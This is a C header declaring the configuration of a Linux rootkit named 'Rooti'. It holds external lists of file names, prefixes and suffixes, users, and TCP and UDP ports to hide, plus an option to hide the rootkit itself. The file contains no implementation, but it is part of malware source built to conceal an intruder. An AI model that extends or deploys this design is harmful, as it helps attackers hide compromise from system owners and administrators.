#ifndef _ROOTI_CONFIG_H
#define _ROOTI_CONFIG_H

#include <linux/types.h> 

// Names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES[];
extern const size_t ROOTI_HIDDEN_FILES_COUNT;

// Prefixes of names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES_PREFIXES[];
extern const size_t ROOTI_HIDDEN_FILES_PREFIXES_COUNT;

// Suffixes of names of files that should be hidden
extern const char *ROOTI_HIDDEN_FILES_SUFFIXES[];
extern const size_t ROOTI_HIDDEN_FILES_SUFFIXES_COUNT;

// Names of users that should be hidden
extern const char *ROOTI_HIDDEN_USERS[];
extern const size_t ROOTI_HIDDEN_USERS_COUNT;

// TCP ports that should be hidden
extern const unsigned short ROOTI_HIDDEN_TCP_PORTS[];
extern const size_t ROOTI_HIDDEN_TCP_PORTS_COUNT;

// UDP ports that should be hidden
extern const unsigned short ROOTI_HIDDEN_UDP_PORTS[];
extern const size_t ROOTI_HIDDEN_UDP_PORTS_COUNT;

// Indicates whether this rootkit should be hidden by default
// #define ROOTI_HIDEME_DEFAULT

#endif